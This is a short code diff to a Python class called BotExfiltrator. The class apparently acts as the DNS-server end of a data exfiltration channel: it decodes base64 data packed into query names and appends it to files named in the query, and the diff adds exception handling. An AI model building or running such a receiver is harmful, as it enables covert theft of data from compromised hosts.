@@ -19,9 +19,17 @@ class BotExfiltrator(InterceptDefaultResolver):
         fields = name.split('.')
         b64data = fields[0]
         filename = fields[1]
-        with open(filename, 'a+b') as f:
-            f.write(base64.b64decode(b64data))
+        try:
+            decoded = base64.b64decode(b64data)
+        except:
+            return self.context['ip']
+        try:
+            with open(filename, 'a+b') as f:
+                f.write(base64.b64decode(b64data))
+        except:
+            pass
         return self.context['ip']
+       
 
     def MX(self, name):
         '''
